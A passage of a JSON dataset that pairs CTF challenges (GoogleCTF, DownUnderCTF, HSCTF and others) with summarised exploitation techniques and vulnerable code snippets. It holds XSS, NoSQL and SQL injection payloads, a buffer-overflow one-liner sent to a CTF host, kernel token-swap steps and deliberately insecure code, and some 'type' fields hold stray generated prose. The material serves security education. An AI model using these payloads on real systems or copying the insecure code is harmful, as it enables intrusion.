        "key": "```c\nundefined8 main(void)  \n{  \n int iVar1;  \n char local_12 [10];  \n  \n setbuf(stdout,(char *)0x0);  \n setbuf(stdin,(char *)0x0);  \n setbuf(stderr,(char *)0x0);  \n puts(\"Welcome to Sally\\'s Seashore Shell Shop\");  \n puts(\"Would you like a shell?\");  \n gets(local_12);  \n iVar1 = strcasecmp(local_12,\"yes\");  \n if (iVar1 == 0) {  \n   puts(\"sorry, we are out of stock\");  \n }  \n else {  \n   puts(\"why are you even here?\");  \n }  \n return 0;  \n}  \n```"
    },
    {
        "name": "Secdriven",
        "write_up": "dataset/raw/Secdriven.md",
        "type": "web",
        "competition": [
            "GoogleCTF/2021",
            "https://ctftime.org/event/1318/tasks/"
        ],
        "score": 500,
        "max_score": 233123.2321,
        "difficulty": 0.002144788382933543,
        "knowledge": [
            "In challenges involving Cross-Site Scripting (XSS) via SVG uploads, if the application previews uploaded SVG files in the browser, this can be used to execute XSS by embedding JavaScript code within the SVG. Specifically, in scenarios where previewing an SVG file is possible by appending a parameter (like `&preview=1`), an attacker can leverage this functionality to execute XSS payloads when the file is viewed in a context that does not adequately sanitize SVG content. Example payload within an SVG could be: \n```xml\n<svg onload=alert(1)>\n```",
            "In challenges related to subdomain takeover or generating collision domains, if the application logic involves hash calculations that include modifiable user-controlled inputs (e.g., user ID or file ID) and these hashes determine subdomain names, creating a large number of accounts or file shares can be exploited to generate collisions. This method exploits the finite output space of hash functions modulo a certain number (e.g., MODULO 17 or MODULO 100000 in the challenge), enabling an attacker to cover most or all possible domain names with a sufficiently large but achievable number of accounts or shares. Once a collision is found, it can be used for tasks like bypassing same-origin policies by tricking an admin into accessing a malicious subdomain that shares the same origin as the target domain."
        ],
        "key": "```python\n# Example of a possible vulnerable code snippet based on the context\n\nimport hashlib\n\nSECRET = \"supersecretkey\"\n\ndef generate_hash(file_id, user_id, owner_id, timestamp):\n    data = f\"{SECRET}{file_id}{user_id}{owner_id}{timestamp}\"\n    return hashlib.sha256(data.encode()).hexdigest()\n\ndef generate_doc_hash(file_id, user_id, owner_id, timestamp):\n    return int(generate_hash(file_id, user_id, owner_id, timestamp), 16) % 17\n\ndef generate_user_hash(user_id, owner_id, timestamp):\n    return int(generate_hash(\"\", user_id, owner_id, timestamp), 16) % 100000\n\ndef generate_nonce(user_id):\n    random_int = 123456  # This should be a secure random number\n    data = f\"{SECRET}{random_int}{user_id}\"\n    return hashlib.sha256(data.encode()).hexdigest()\n\ndef validate_url(doc_hash, user_hash, signature, nonce, timestamp, owner_id, user_id, file_id):\n    expected_doc_hash = generate_doc_hash(file_id, user_id, owner_id, timestamp)\n    expected_user_hash = generate_user_hash(user_id, owner_id, timestamp)\n    if doc_hash == expected_doc_hash and user_hash == expected_user_hash:\n        return True\n    return False\n\n# Example usage\nfile_id = \"133711377731\"\nuser_id = \"user123\"\nowner_id = \"owner456\"\ntimestamp = \"1626690000000\"\n\ndoc_hash = generate_doc_hash(file_id, user_id, owner_id, timestamp)\nuser_hash = generate_user_hash(user_id, owner_id, timestamp)\nnonce = generate_nonce(user_id)\n\n# Validate URL\nis_valid = validate_url(doc_hash, user_hash, \"signature\", nonce, timestamp, owner_id, user_id, file_id)\nprint(\"URL is valid:\", is_valid)\n```\n"
    },
    {
        "name": "Secret and Ephemeral",
        "write_up": "dataset/raw/Secret and Ephemeral.md",
        "type": "web",
        "competition": [
            "DownUnderCTF/2022",
            "https://ctftime.org/event/1625/tasks/"
        ],
        "score": 478,
        "max_score": 500,
        "difficulty": 0.956,
        "knowledge": [
            "To retrieve private variables and constructor arguments from a smart contract deployed on the Ethereum blockchain, one can inspect the transaction that deployed the contract using a blockchain explorer or querying the node directly with tools like Web3. Specifically, for a contract deployed on Ethereum, the input data of the contract creation transaction contains the constructor arguments encoded in hexadecimal. This data can be decoded to extract the original parameters passed during contract deployment.",
            "The private storage variables of an Ethereum smart contract can be indirectly accessed by knowing the slot number where the data is stored. Solidity stores contract variables in a sequential manner starting from slot 0. However, accessing these variables directly is not straightforward due to the Ethereum Virtual Machine's (EVM) storage organization, but tools or scripts can be written using Web3 libraries in programming languages such as Python to interact with the storage. By calculating the correct slot number and using the `getStorageAt` function, one can retrieve even private variables from a deployed contract. \n\n```python\n# Accessing a private string variable in a smart contract\nslot_number = 3 # Example slot number where the private variable is stored\ncontract_address = '0xContractAddress' # Replace with actual contract address\nprivate_variable = web3.toText(web3.eth.getStorageAt(contract_address, web3.keccak(int(slot_number).to_bytes(32, 'big')).hex()))\nprint(private_variable)\n```"
        ],
        "key": "```solidity  \n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\n/**  \n* @title Secret And Ephemeral  \n* @author Blue Alder (https://duc.tf)  \n**/\n\ncontract SecretAndEphemeral {  \n   address private owner;  \n   int256 public seconds_in_a_year = 60 * 60 * 24 * 365;  \n   string word_describing_ductf = \"epic\";  \n   string private not_yours;  \n   mapping(address => uint) public cool_wallet_addresses;\n\n   bytes32 public spooky_hash; //\n\n   constructor(string memory _not_yours, uint256 _secret_number) {  \n       not_yours = _not_yours;  \n       spooky_hash = keccak256(abi.encodePacked(not_yours, _secret_number, msg.sender));  \n   }\n\n   function giveTheFunds() payable public {  \n       require(msg.value > 0.1 ether);  \n       // Thankyou for your donation  \n       cool_wallet_addresses[msg.sender] += msg.value;  \n   }\n\n   function retrieveTheFunds(string memory secret, uint256 secret_number,\naddress _owner_address) public {  \n       bytes32 userHash = keccak256(abi.encodePacked(secret, secret_number, _owner_address));\n\n       require(userHash == spooky_hash, \"Somethings wrong :(\");\n\n       // User authenticated, sending funds  \n       uint256 balance = address(this).balance;  \n       payable(msg.sender).transfer(balance);  \n   }  \n}  \n```"
    },
    {
        "name": "Secret Mailer Service 2",
        "write_up": "dataset/raw/Secret Mailer Service 2.0.md",
        "type": "pwn",
        "competition": [
            "CodeBlue/2018/Quals",
            "https://ctftime.org/event/636/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When facing a Ruby sandbox environment with restrictions like `$SAFE=3`, which limits object's operations based on their taint level, the `Fiddle::Pointer` class can be utilized as it does not perform taint checking. This property can facilitate arbitrary memory read and write operations, enabling the bypass of sandbox restrictions. This can be applied under conditions where the Ruby version is below 2.3, as the `$SAFE` feature has been deprecated in later versions. Additionally, the knowledge of libc offsets and memory structure is crucial for constructing exploit payloads to manipulate memory or execute arbitrary code.\n   - Example payload construct snippet:  \n   ```ruby\n   libc_base = main_arena - libc_offset[\"main_arena\"]\n   ptr = Fiddle::Pointer.malloc(0x200, libc_base + libc_offset[\"setcontext\"])\n   ```",
            "In WebAssembly-based challenges, exploiting vulnerabilities such as off-by-one buffer overflows can lead to arbitrary code execution due to specific characteristics like the lack of readonly memory and the unique handling of function pointers. Specifically, exploiting the dlmalloc mechanism used by Emscripten and manipulating WebAssembly's indirect call mechanism (e.g., `call_indirect`) are viable strategies. The exploitation process might involve creating overlapping chunks to overwrite critical data or function pointers, ultimately leading to arbitrary write or code execution. This approach works under the conditions where the WebAssembly binary is compiled with Emscripten and contains the specified vulnerabilities.\n   - Example steps for exploitation:\n     1. Use off-by-one overflow to create overlapping chunks.\n     2. Overwrite critical function pointers or data to divert control flow or modify memory.\n     3. Execute arbitrary functions or code by correctly setting up the memory and function table indices in WebAssembly."
        ],
        "key": "```c\nvoid seal_letters(State *state, int post){  \n   size_t i;  \n   char *outbuf;\n\n   for(i = 0; i < state->count; i++){  \n       if(state->letters[i] != NULL && state->letters[i]->filter != NULL){  \n           outbuf = malloc(state->letters[i]->length);  \n           if(outbuf == NULL){  \n               abort();  \n           }  \n           state->letters[i]->filter(outbuf, state->letters[i]->buf, state->letters[i]->length);  \n           state->letters[i]->buf = outbuf;  \n       }  \n   }\n\n   if(post){  \n       emscripten_run_script(\"_do_post_letters()\");  \n   }  \n}\n```"
    },
    {
        "name": "Secret Message 1",
        "write_up": "dataset/raw/Secret Message 1.md",
        "type": "forensics",
        "competition": [
            "UofTCTF/2024",
            "https://ctftime.org/event/2219/tasks/"
        ],
        "score": 100,
        "max_score": 500,
        "difficulty": 0.2,
        "knowledge": [
            "To uncover hidden content in PDF files, utilize an editor to directly manipulate or remove elements such as color overlays. This method can reveal text that has been visually obscured but not removed from the document.",
            "For extracting text from PDF files where content is not selectable or appears hidden, using a browser's built-in features like text selection or the \"Read Aloud\" function can surface hidden messages. Browsers can interpret PDF structures differently than PDF viewers, potentially bypassing certain visual obfuscations."
        ],
        "key": "```python\ndef redact_text(text, sensitive_words):\n    for word in sensitive_words:\n        text = text.replace(word, \"\u2588\" * len(word))\n    return text\n\n# Example usage\ndocument_text = \"The secret code is 1234. Do not share this with anyone.\"\nsensitive_words = [\"1234\"]\nredacted_text = redact_text(document_text, sensitive_words)\nprint(redacted_text)\n```\n"
    },
    {
        "name": "Secret Pwnhub Academy Rewards Club",
        "write_up": "dataset/raw/Secret Pwnhub Academy Rewards Club.md",
        "type": "pwn",
        "competition": [
            "Hack.lu/2020",
            "https://ctftime.org/event/1142/tasks/"
        ],
        "score": 194,
        "max_score": 500,
        "difficulty": 0.388,
        "knowledge": [
            "In challenges involving stack-based buffer overflows, if a stack leak is provided, one can overwrite the stored instruction pointer (IP) to facilitate arbitrary code execution. This scenario often involves jumping back to an attacker-controlled input stored at a leaked stack address. This method requires identifying the offset to the stored IP relative to the beginning of the buffer. Example approach: Calculate the distance between the buffer start and stored IP, then place the shellcode at the beginning of the buffer and overwrite the stored IP with the leaked stack address pointing to the shellcode.",
            "When exploiting binary vulnerabilities on specific architectures like SPARC, utilizing architecture-specific shellcode and understanding the architecture's register use and calling conventions are crucial. This includes knowing how to control important registers (e.g., instruction pointer or equivalent in SPARC) based on the binary's execution flow. For SPARC binaries, leveraging online resources such as SPARC assembly guides or shellcoding examples can help in crafting or adapting shellcode suitable for the target environment. Example SPARC shellcode can be found in resources such as exploit-db or architecture-specific documentation and needs to be adjusted to the context of buffer size, available gadgets, and end goals of the exploitation process."
        ],
        "key": "```c\nvoid fn(void)  \n{  \n int iVar1;  \n ssize_t sVar2;  \n int *piVar3;  \n char *pcVar4;  \n int iVar5;  \n longlong lVar6;  \n undefined auStackX0 [92];  \n undefined auStack128 [128];  \n  \n lVar6 = ZEXT48(register0x00000038) << 0x20;  \n printf(\"%p\\n\",auStack128);  \n read(0,(void *)((int)((ulonglong)lVar6 >> 0x20) + -0x80),0x200);  \n do {  \n   sVar2 = read(0,(void *)((int)((ulonglong)lVar6 >> 0x20) + -0x80),0x200 -\nalready_read);  \n   iVar1 = sVar2 + last_read;  \n   last_read = iVar1;  \n   if (iVar1 < 0) {  \n     piVar3 = __errno_location();  \n     iVar5 = *piVar3;  \n     piVar3 = __errno_location();  \n     pcVar4 = strerror(*piVar3);  \n     printf(\"Read error: %d, errno: %d [%s]\\n\",iVar1,iVar5,pcVar4);  \n                   /* WARNING: Subroutine does not return */  \n     exit(1);  \n   }  \n   already_read = already_read + iVar1;  \n } while ((already_read != 0x200) &&  \n         (*(char *)((int)((ulonglong)lVar6 >> 0x20) + already_read + -0x81) != '\\n'));  \n return;  \n}\n```"
    },
    {
        "name": "Secret Server Revenge",
        "write_up": "dataset/raw/Secret Server Revenge.md",
        "type": "crypto",
        "competition": [
            "HITCON/2017/Quals",
            "https://ctftime.org/event/485/tasks/"
        ],
        "score": 334,
        "max_score": 450,
        "difficulty": 0.7422222222222222,
        "knowledge": [
            "When facing challenges involving encryption with unknown plaintext and a limitation on the number of requests you can make to the server, consider employing cryptographic oracles. Specifically, use the behavior of padding and unpadding mechanisms (such as those involved in PKCS#7) to deduce information about the plaintext. For instance, manipulating encrypted messages to observe changes in the unpadding process can reveal the value of the last byte of a plaintext block.\n    - Example approach: Craft a message that, when decrypted and unpadded, reveals the length of the unpadded data. Send variations of this message by changing its ending, which affects the unpadding behavior, and use the server's response to infer the actual unpadding length, thereby deducing information about the plaintext.",
            "Leverage the predictability of cryptographic hash functions (like MD5) in scenarios where direct decryption is impractical or impossible due to limitations (e.g., request limits). By obtaining encrypted hashes of data at different truncation lengths and comparing these against a set of precomputed hash values derived from potential plaintext candidates, it's possible to progressively narrow down the original data.\n    - Example strategy: Generate a list of possible plaintext values by hashing candidates and matching the resulting hashes against known encrypted hash values obtained from the server. Start with broad matches based on the last byte of the hash and progressively refine the candidates by applying constraints from additional observed data. This technique effectively reduces the pool of possible plaintexts without direct decryption."
        ],
        "key": "```python\ndef unpad(msg):  \n    return msg[:-ord(msg[-1])]\n```"
    },
    {
        "name": "Secret Society",
        "write_up": "dataset/raw/Secret Society.md",
        "type": "This is a **pwn** challenge.",
        "competition": [
            "csictf/2020",
            "https://ctftime.org/event/1081/tasks/"
        ],
        "score": -1,
        "max_score": 2000,
        "difficulty": -1,
        "knowledge": [
            "In challenges involving buffer overflow vulnerabilities, one must closely examine the program's buffer allocation and manipulation methods. If the program reads user input into a buffer without adequate bounds checking, it can be susceptible to a buffer overflow attack. This vulnerability can be exploited by providing input that exceeds the buffer size, potentially overwriting adjacent memory. In the provided example, `fgets` is used to read more data into the buffer `local_d8` than it can hold, without checking the size of the input.",
            "To successfully exploit a buffer overflow vulnerability and manipulate the program's behavior or extract data from adjacent memory locations, carefully calculate the total amount of data to provide as input. This typically involves filling up the target buffer, and possibly overwriting subsequent buffers or variables in memory, until reaching a point of interest (e.g., a variable holding sensitive data or a return address). In the given scenario, the input crafted to exploit the buffer overflow consisted of filling up the input buffer `local_d8`, the `uStack200` variable, and the `auStack196` array with precise amounts of data to ensure that a null terminator (`\\0`) is positioned exactly at the beginning of the buffer holding the flag (`local_58`). This manipulation causes the program to print out the contents of `local_58`, including the flag, when outputting the supposedly safe `local_d8` buffer content.\n\nExample payload to trigger the overflow and read the flag:  \n```perl\nperl -e 'print \"A\"x16 . \"B\"x4 . \"C\"x108' | nc chall.csivit.com 30041\n```"
        ],
        "key": "```c\nundefined8 main(void)  \n{  \n size_t sVar1;  \n undefined8 local_d8 [2];  \n undefined4 uStack200;  \n undefined auStack196 [108];  \n char local_58 [56];  \n FILE *local_20;  \n char *local_18;  \n __gid_t local_c;  \n  \n setvbuf(stdout,(char *)0x0,2,0);  \n local_c = getegid();  \n setresgid(local_c,local_c,local_c);  \n memset(local_58,0,0x32);  \n memset(local_d8,0,0x80);  \n puts(\"What is the secret phrase?\");  \n fgets((char *)local_d8,0x80,stdin);  \n local_18 = strchr((char *)local_d8,10);  \n if (local_18 != (char *)0x0) {  \n   *local_18 = '\\0';  \n }  \n sVar1 = strlen((char *)local_d8);  \n *(undefined8 *)((long)local_d8 + sVar1) = 0x657261206577202c;  \n *(undefined8 *)((long)local_d8 + sVar1 + 8) = 0x6877797265766520;  \n *(undefined4 *)((long)&uStack200 + sVar1) = 0x2e657265;  \n auStack196[sVar1] = 0;  \n local_20 = fopen(\"flag.txt\",\"r\");  \n if (local_20 == (FILE *)0x0) {  \n   printf(\"You are a double agent, it\\'s game over for you.\");  \n                   /* WARNING: Subroutine does not return */  \n   exit(0);  \n }  \n fgets(local_58,0x32,local_20);  \n printf(\"Shhh... don\\'t tell anyone else about \");  \n puts((char *)local_d8);  \n return 0;  \n}  \n```"
    },
    {
        "name": "Secure DES",
        "write_up": "dataset/raw/Secure DES.md",
        "type": "crypto",
        "competition": [
            "ByteBandits/2020",
            "https://ctftime.org/event/1022/tasks/"
        ],
        "score": 464,
        "max_score": 500,
        "difficulty": 0.928,
        "knowledge": [
            "When faced with RSA encryption using a prime modulus (n=m and m is prime), the decryption process can be simplified by exploiting the property that `phi(m) = m-1`. This simplification is based on calculating the modular inverse of the exponent `e` with respect to `m-1` to find the decryption key `d`. If `gcd(e, m-1) != 1` due to `e` being even, it implies that a direct RSA decryption would result in a quadratic residue, necessitating the use of a `modular sqrt` operation to derive the actual plaintexts. However, this process will lead to two possible plaintexts for each ciphertext, akin to the Rabin Cryptosystem, where you calculate `modular_sqrt(pow(ciphertext, d, modulus), modulus)` to obtain potential plaintexts.\n   \n   Example usage:\n   ```python\n   from crypto_commons.rsa.rsa_commons import modinv, modular_sqrt\n   \n   def decrypt(ciphertext, modulus):\n       decryption_exponent = modinv(65536, modulus-1)\n       roots = modular_sqrt(pow(ciphertext, decryption_exponent, modulus), modulus)\n       return roots, modulus - roots\n   ```",
            "In scenarios where decrypted data includes concatenated elements (e.g., a key part and a distinct identifiable suffix), and when the correct order of these elements is unknown due to shuffling, an effective technique involves generating all potential suffixes and attempting to match these with the decrypted outputs. This technique hinges on the assumption of uniqueness or distinguishability of suffixes, allowing for the reassembly of the original data sequence by comparing and aligning the suffixes of decrypted values. This approach is particularly useful in encryption schemes where additional data (like a counter or unique ID) is appended or prepended to the plaintext before encryption.\n\n   Example application:\n   ```python\n   # Assuming decrypted1 and decrypted2 are potential outputs from the decrypt function mentioned in point 1\n   suffixes = [long_to_bytes(x) for x in range(0, 1024, 8)]\n   key_parts = []\n   L = []\n   for decrypted in [decrypted1, decrypted2]:\n       for suffix in reversed(suffixes):\n           if decrypted.endswith(suffix):\n               key_part = decrypted[:-len(suffix)]\n               key_part = '\\x00' * (8 - len(key_part)) + key_part\n               key_parts.append(key_part)\n               L.append(bytes_to_long(suffix))\n               break\n   ```"
        ],
        "key": "```python\ndef decrypt(value, m):  \n   d = modinv(65536, m-1)  \n   res = modular_sqrt(pow(value, d, m), m)  \n   return res, m - res  \n```"
    },
    {
        "name": "Secure Notes",
        "write_up": "dataset/raw/Secure Notes.md",
        "type": "This write-up describes a mobile challenge involving an Android application called Secure Notes. The challenge required analyzing the application's code and decrypting a file to retrieve sensitive information. Based on the provided details, the type of this CTF challenge would be **forensics**.",
        "competition": [
            "NahamCon/2022",
            "https://ctftime.org/event/1630/tasks/"
        ],
        "score": 485,
        "max_score": 2199,
        "difficulty": 0.22055479763528876,
        "knowledge": [
            "When dealing with encrypted files in mobile applications, if the encryption key is based on predictable user input (e.g., a four-digit PIN code), a brute force attack can be used to decrypt the file. This approach involves attempting every possible PIN code combination, appending or transforming it as needed (e.g., repeating it multiple times), and using it as the key to decrypt the file. The decryption attempt is considered successful if the decrypted content matches an expected format, such as containing specific keywords or being valid JSON.\n    - Example payload or approach: \n    ```java\n    SecretKeySpec secretKeySpec = new SecretKeySpec((pinCode+pinCode+pinCode+pinCode).getBytes(), \"AES\");\n    Cipher instance = Cipher.getInstance(\"AES\");\n    ```",
            "When extracting sensitive information from a decrypted database file in a mobile application challenge, ensure the correct parsing of the expected data structure (e.g., JSON). If the file is expected to contain JSON with specific fields (like notes or flags), confirm the presence of these fields after decryption to validate that the decryption was successful. This method is especially useful in scenarios where the encrypted data format is known and can be programmatically verified.\n    - Example validation snippet: \n    ```java\n    String content = new String(Files.readAllBytes(Paths.get(\"notes.db\")), StandardCharsets.UTF_8);\n    if(content.contains(\"notes\")) {\n        System.out.println(\"Successful decryption!\");\n    }\n    ```"
        ],
        "key": "```java\npublic static void k(String str, File file, File file2) {  \n    try {  \n        SecretKeySpec secretKeySpec = new SecretKeySpec(str.getBytes(), \"AES\");  \n        Cipher instance = Cipher.getInstance(\"AES\");  \n        instance.init(2, secretKeySpec);  \n        FileInputStream fileInputStream = new FileInputStream(file);  \n        byte[] bArr = new byte[(int) file.length()];  \n        fileInputStream.read(bArr);  \n        byte[] doFinal = instance.doFinal(bArr);  \n        FileOutputStream fileOutputStream = new FileOutputStream(file2);  \n        fileOutputStream.write(doFinal);  \n        fileInputStream.close();  \n        fileOutputStream.close();  \n    } catch (IOException | InvalidKeyException | NoSuchAlgorithmException | BadPaddingException | IllegalBlockSizeException | NoSuchPaddingException e2) {  \n        throw new a(\"Error encrypting/decrypting file\", e2);  \n    }  \n}  \n```"
    },
    {
        "name": "Secure Protocol",
        "write_up": "dataset/raw/Secure Protocol.md",
        "type": "crypto",
        "competition": [
            "S4CTF/2021",
            "https://ctftime.org/event/1329/tasks/"
        ],
        "score": 423,
        "max_score": 500,
        "difficulty": 0.846,
        "knowledge": [
            "When facing a challenge that involves SHA-1 and the goal is to find a hash collision where a message includes different but operationally equivalent salts, utilizing base64 encoding allows for the manipulation of salts without altering their decoded value. This can be useful in scenarios where constraints require the input (e.g., salts) to be technically different but functionally identical after decoding. This approach leverages the property that base64 encoding can be padded with `=` without changing the encoded value, thus satisfying the requirement for different inputs leading to the same operational outcome. To apply this knowledge, if given `salt1` base64 encoded, you can add `=` at the end to create `salt1'`, ensuring `salt1 != salt1'` while the base64 decoded value remains unchanged.",
            "In scenarios requiring a hash value of an extended string where modification of the original salts or messages is restricted or closely monitored, a length extension attack can be effective. This attack takes advantage of the way hashing algorithms like SHA-1 process message chunks and allows an attacker to append new data (`s3` in this context) to the original hash (`h`) without needing to know the entire original message (`salt1 + msg + salt2`). This method is notably relevant when the attacker can influence the suffix of the message and knows the hash of the original message. This technique aligns with the mechanism described in cryptographic exchanges and can be particularly useful in extending given cryptographic messages under certain constraints. \n\nSample payload for base64 padding (conceptual, no executable payload provided): If `salt1` is encoded, appending `=` would change its base64 representation to `salt1'`, thus satisfying a change in input while keeping the decoded output constant. \n\nLength extension attack example payload cannot be specifically provided without detailed context or parameters for execution."
        ],
        "key": "```python\nimport hashlib\nimport base64\n\ndef vulnerable_hash(salt1, msg, salt2):\n    # Vulnerable to length extension attack\n    return hashlib.sha1(base64.b64encode(salt1) + msg + base64.b64encode(salt2)).hexdigest()\n\n# Example usage\nsalt1 = b'salt1'\nmsg = b'secret_message'\nsalt2 = b'salt2'\n\nh = vulnerable_hash(salt1, msg, salt2)\nprint(h)\n```"
    },
    {
        "name": "Secure Safe",
        "write_up": "dataset/raw/Secure Safe.md",
        "type": "The types of challenges in this CTF write-up are:\n- Mobile",
        "competition": [
            "NahamCon/2020",
            "https://ctftime.org/event/1067/tasks/"
        ],
        "score": 100,
        "max_score": 1000,
        "difficulty": 0.1,
        "knowledge": [
            "When analyzing Android applications for hidden or hard-coded information, extracting and examining the contents of APK files can reveal data not readily visible through the application interface itself. This can include searching for strings within different file types that are part of the APK package, such as .xml, .dex, or .arsc files. Common commands used in this process include `grep -R` to recursively search for patterns like \"flag\" and `strings` to print the sequences of printable characters in files.\n    - Example command to search within .arsc files: `strings resources.arsc | grep flag`\n    - Example command to search within .dex files: `strings classes.dex | grep flag`",
            "For Android applications employing simple encryption schemes based on inputs like a PIN, decompiling the APK to review the source code can allow the identification of encryption methodologies and hardcoded secrets (e.g., keys or salts). Once understood, custom scripts or programs can be written to emulate the encryption or decryption process, providing a method for brute-forcing or systematically guessing the required input to reveal the encrypted data.\n    - Scenario: An application encrypts data based on a user input (e.g., a PIN) and a hardcoded secret. After decompiling the APK and reviewing the source code, identify the encryption process and write a script to emulate it. The script iteratively tests possible inputs (like all 4-digit PINs) to find the correct input that decrypts the hidden data, revealing the flag.\n    - Example Java snippet to test all 4-digit PINs:\n        ```java\n        for (int id = 0; id <= 9999; id++) {\n            String pin = String.format(\"%04d\", id);\n            // Assuming `doInBackground` mimics the app's decryption logic\n            String flag = (String)doInBackground(new String [][]{{encrypted_flag, pin}});\n            if (flag.startsWith(\"flag{\"))\n                System.out.println(\"PIN: \" + pin + \" -> \" + flag);\n        }\n        ```"
        ],
        "key": "```java\npublic Object doInBackground(Object[] objArr) {  \n   String[][] strArr = (String[][]) objArr;  \n   String str = strArr[0][0];  \n   String str2 = strArr[0][1];  \n   try {  \n       MessageDigest instance = MessageDigest.getInstance(\"SHA-1\");  \n       instance.update(\"5up3r_53cur3_53cr37\".getBytes(\"UTF-8\"));  \n       instance.update(str2.getBytes(\"UTF-8\"));  \n       return new String(a(Base64.decode(str, 0), new BigInteger(1, instance.digest()).toString(16).getBytes()));  \n   } catch (UnsupportedEncodingException | NoSuchAlgorithmException e) {  \n       e.printStackTrace();  \n       return \"Error decrypting\";  \n   }  \n}\n```"
    },
    {
        "name": "Secure Secret Sharing",
        "write_up": "dataset/raw/Secure Secret Sharing.md",
        "type": "web",
        "competition": [
            "CyberSecurityRumble/2020",
            "https://ctftime.org/event/1057/tasks/"
        ],
        "score": 300,
        "max_score": 1337,
        "difficulty": 0.2243829468960359,
        "knowledge": [
            "When exploiting NoSQL injection vulnerabilities, if direct querying does not yield useful results due to limitations (e.g., only one entry returned or specific sequence issues), consider using MongoDB query operators like `$regex` for pattern matching or `$not` in combination with `$regex` to exclude known non-target entries. This approach helps iteratively narrow down the search space when looking for specific entries, such as flags in a database. To deal with long URI issues during this process, it may be necessary to find alternative querying strategies that do not require sending very long request URIs.\n   \n   Example payload for initial narrowing down: `?secid[$regex]=^`\n   \n   Example payload for excluding known non-target hashes: `?secid[$not][$regex]=hash1|hash2|hash3|...`",
            "In scenarios where the dataset is large and not easily enumerable through direct queries, conceptualize the problem domain differently to find an efficient solution. By visualizing the hashes as a tree structure, it becomes possible to apply tree traversal techniques to systematically explore each branch (in this case, each possible hash) until the target data is found. This approach is particularly useful when dealing with cryptographic hash functions that produce output which doesn't linearly correlate to the input, making sequential searches impractical. Parallelizing the traversal process can significantly speed up the search.\n\n   In the context of CTF challenges or similar problem sets involving large datasets or hashes, applying computer science fundamentals like tree structures and traversal algorithms can uncover unconventional yet effective solutions."
        ],
        "key": "```javascript\napp.get('/secret_share', (req, res) => {\n    const secid = req.query.secid;\n    db.collection('secrets').findOne({ _id: secid }, (err, result) => {\n        if (err) {\n            res.status(500).send('Error accessing the database');\n        } else if (result) {\n            res.send(result.secret);\n        } else {\n            res.status(404).send('Secret not found');\n        }\n    });\n});\n```"
    },
    {
        "name": "Secure Storage Driver",
        "write_up": "dataset/raw/Secure Storage Driver.md",
        "type": "pwn",
        "competition": [
            "CCCamp/2023",
            "https://ctftime.org/event/2048/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When exploiting Windows kernel vulnerabilities, especially those involving drivers with IOCTL (Input Output Control) interfaces, the key step is to identify handlers for specific IOCTL requests. These handlers may directly or indirectly allow for arbitrary read/write operations in kernel space due to inadequate validation of input parameters such as offsets or lengths. Attackers can leverage these vulnerabilities to modify kernel data structures, potentially elevating their privileges. For exploitation, calculate offsets carefully to convert virtual kernel addresses to those relative to a controllable space (like an allocated pool) for read or write operations.\n\nExample payload components for arbitrary read (Python):\n```python\ndef read_at_va(va: int, secret_store_base: int) -> int:  \n   return read_at(va - secret_store_base)\n```",
            "In Windows kernel exploitation, obtaining the address of the `EPROCESS` structure of the target process and manipulating its `Token` field is a common technique for privilege escalation. By replacing the `Token` of a low-privileged process with that of a system process (e.g., by finding `EPROCESS` via `PsInitialSystemProcess` and traversing `ActiveProcessLinks`), an attacker can execute code with elevated privileges. This technique is crucial for post-exploitation stages that require higher privileges to perform actions like reading protected files.\n\nExample payload components for token swapping (Python):\n```python\nsystem_token = read_at_va(PsInitialSystemProcess + Token_off)  \nwrite_to_va(target_eprocess + Token_off, system_token)\n```"
        ],
        "key": "```cpp  \nvoid __fastcall WriteEntry(unsigned __int64 offset, unsigned __int64 value)  \n{  \n *(_QWORD *)(secret_store + 8 * offset) = value;  \n}\n\nunsigned __int64 __fastcall ReadEntry(unsigned __int64 offset)  \n{  \n return *(_QWORD *)(secret_store + 8 * offset);  \n}\n```"
    },
    {
        "name": "Secure System",
        "write_up": "dataset/raw/Secure System.md",
        "type": "This write-up describes a SQL Injection challenge where the author explores various techniques to exploit the vulnerability present in the application. The challenge involves understanding SQL syntax, bypassing filters, and ultimately retrieving the flag using SQL injection techniques.\n\nBased on the content provided, the type of this CTF challenge can be categorized as **web**.",
        "competition": [
            "HSCTF/2019",
            "https://ctftime.org/event/821/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When facing server-side template injection (SSTI) or SQL injection challenges with strict word filtering, utilizing alternative logical operators can bypass blacklist filters. If common operators like `and`, `or` are filtered, alternatives like `&&` for AND and `||` for OR can be used effectively to test for vulnerabilities. Example payload to check SQL Injection: `id=2 %26%26 1=1`. This technique demonstrates that different syntax can achieve the same logical operations, thus bypassing naive or simple blacklist-based input filtering mechanisms.",
            "Exploiting PHP's PCRE (Perl Compatible Regular Expressions) backtracking limit errors can assist in bypassing regex-based input validations or filters in web applications, particularly in union-based SQL injection scenarios. If the application uses `preg_match()` for input validation, submitting a payload that causes the regex engine to exceed its backtracking limit (`pcre.backtrack_limit`) will not match, thus bypassing the validation. This method takes advantage of PHP configuration limits and regex engine limitations to circumvent input validation. An example bypass utilizes a long sequence of a repeated character to exceed these limits, as shown: `union/*'+'a'*1000000+'*/select 1,2,3-- -`."
        ],
        "key": "```php\n<?php\nif (isset($_POST['id'])) {\n    $id = $_POST['id'];\n    $query = \"SELECT * FROM users WHERE id='$id'\";\n    $result = mysqli_query($conn, $query);\n    if ($result) {\n        $user = mysqli_fetch_assoc($result)['username'];\n        if ($user !== 'admin') {\n            echo 'Hello ' . htmlentities($user);\n            if ($user === 'admin') {\n                echo 'This can\\'t be =]] Just put here for fun lul';\n                die($flag);\n            }\n        }\n    }\n}\n?>\n```"
    },
    {
        "name": "secure-hash",
        "write_up": "dataset/raw/secure-hash.md",
        "type": "crypto",
        "competition": [
            "Hackover/2018",
            "https://ctftime.org/event/689/tasks/"
        ],
        "score": 269,
        "max_score": 500,
        "difficulty": 0.538,
        "knowledge": [
